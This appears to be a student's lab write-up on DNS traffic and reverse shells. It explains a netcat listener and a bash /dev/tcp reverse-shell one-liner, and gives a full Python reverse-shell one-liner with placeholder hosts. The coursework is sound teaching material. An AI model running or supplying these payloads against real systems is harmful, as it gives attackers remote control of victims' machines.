# Shell stuff

there were 2 dns packets, one query and one response.
A dns request has just been performed. This allows us to retrieve IP addresses associated with domain names.
The protocol is DNS and over UDP as this is faster.
The authoritative server for sfu.ca responds to the local resolver which we then see with dig.

![alt text](<Screenshot 2025-01-09 at 2.14.15 PM.png>)

![alt text](<Screenshot 2025-01-09 at 2.14.25 PM.png>)

# 2.2.3

● Which command should you run first? Why?
The command to run first is nc -nlvp 9090. This is because you want to set up the listener first for the shell to connect back to the attacker.

● Show a screenshot from the victim machine when you attempt to spawn a reverse shell using the wrong order.

![alt text](<Screenshot 2025-01-09 at 9.09.44 PM.png>)

● Explain how these two commands work.

nc -lvnp 9090 will make a netcat listener on port 9090 and providing verbose output and avoid dns to resolve hostnames ot improve speed.

The /bin/bash -i >& /dev/tcp/attacker-ip/9090 0<&1 2>&1
This command will open a reverse shell on the victim machine which will connect to the attacker machine on port 9090. 
/bin/bash -i will start a bash instance in interactive mode.
Then the output of the shell is redirected to a file that allows direct communication with a remote host through TCP. Then standard output is redirected to standard input, allowing attacker to send input and also standard error is redirected to standard out so both are sent to attacker.

● Take a proper screenshot showing that you successfully executed a reverse shell.

![alt text](<Screenshot 2025-01-09 at 9.11.19 PM.png>)

● Are the transmitted packets on the wire encrypted? Prove your answer with proper screenshots (Hint: can you use Wireshark?)
They are not encrypted as I can see the information sent in clear text.

![alt text](<Screenshot 2025-01-09 at 9.53.56 PM.png>)

● Suggest another method to run a reverse shell (with sufficient explanation), and show proper screenshots of running a reverse shell using this method.
Another method is to use a python script.

python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("IPADDRESS",PORT));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'

![alt text](<Screenshot 2025-01-09 at 10.34.04 PM.png>)

